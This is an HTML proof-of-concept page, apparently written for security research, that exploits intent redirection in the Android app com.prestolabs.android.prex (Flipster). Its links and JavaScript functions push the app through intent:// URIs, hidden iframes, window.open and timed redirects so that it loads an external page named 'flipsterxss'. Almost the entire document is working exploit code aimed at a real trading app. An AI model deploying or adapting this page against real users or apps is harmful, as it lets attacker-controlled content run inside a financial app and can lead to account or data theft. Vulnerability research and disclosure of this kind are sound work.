<!DOCTYPE html>
<html>
<head>
    <title>Flipster PoC</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
    <h2>Flipster Intent Redirection PoC</h2>

    <p><a href="intent://flipster.io/https://xaleraf4ra.github.io/flipsterxss/#Intent;scheme=https;package=com.prestolabs.android.prex;end">
        1. Intent link
    </a></p>

    <p><a href="intent://flipster.io/https://xaleraf4ra.github.io/flipsterxss/#Intent;scheme=https;action=android.intent.action.VIEW;package=com.prestolabs.android.prex;component=com.prestolabs.android.prex/.presentations.ui.MainActivity;end">
        2. Intent with component
    </a></p>

    <p><button onclick="method1()">3. Location redirect</button></p>

    <p><button onclick="method2()">4. Iframe method</button></p>

    <p><button onclick="method3()">5. Window.open</button></p>

    <p><button onclick="method4()">6. Multi-attempt</button></p>

    <script>
    var target = "intent://flipster.io/https://xaleraf4ra.github.io/flipsterxss/#Intent;scheme=https;package=com.prestolabs.android.prex;end";
    var direct = "https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/";

    function method1() {
        window.location.href = target;
    }

    function method2() {
        var i = document.createElement("iframe");
        i.style.display = "none";
        i.src = target;
        document.body.appendChild(i);
    }

    function method3() {
        window.open(target, "_self");
    }

    function method4() {
        var i = document.createElement("iframe");
        i.style.display = "none";
        i.src = target;
        document.body.appendChild(i);

        setTimeout(function() {
            window.location.href = target;
        }, 1000);

        setTimeout(function() {
            window.location.href = direct;
        }, 3000);
    }
    </script>
</body>
</html>
